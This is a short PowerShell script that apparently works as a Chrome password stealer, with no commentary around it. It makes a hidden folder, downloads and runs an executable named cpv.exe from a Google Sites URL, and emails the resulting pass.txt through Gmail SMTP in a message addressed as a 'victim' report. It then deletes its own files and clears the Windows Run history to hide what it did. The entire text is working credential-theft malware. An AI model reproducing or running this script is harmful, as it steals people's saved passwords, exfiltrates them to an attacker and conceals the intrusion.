cd /;md Intel;cd Intel;md chrome;
$f=get-item .\chrome -Force
$f.attributes="Hidden"
cd chrome;
wget https://sites.google.com/site/exploitechx/cpv.enc -OutFile cpv.exe
start cpv.exe
Start-Sleep -s 10

$SMTPServer = 'smtp.gmail.com'


  $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)


  $SMTPInfo.EnableSsl = $true


  $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('####HARDCODED_EMAIL######', '####HARDCODED_PASS####')


  $ReportEmail = New-Object System.Net.Mail.MailMessage


  $ReportEmail.From = '####HARDCODED_EMAIL######'


  $ReportEmail.To.Add('####HARDCODED_EMAIL######')


  $ReportEmail.Subject = 'Chrome Pass Report of ' + $env:UserName


  $ReportEmail.Body = 'Attached is your victim Chrome Passwords'


  $ReportEmail.Attachments.Add('pass.txt')


  $SMTPInfo.Send($ReportEmail)

rm w.txt -Force
rm w.PS1 -Force
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
exit
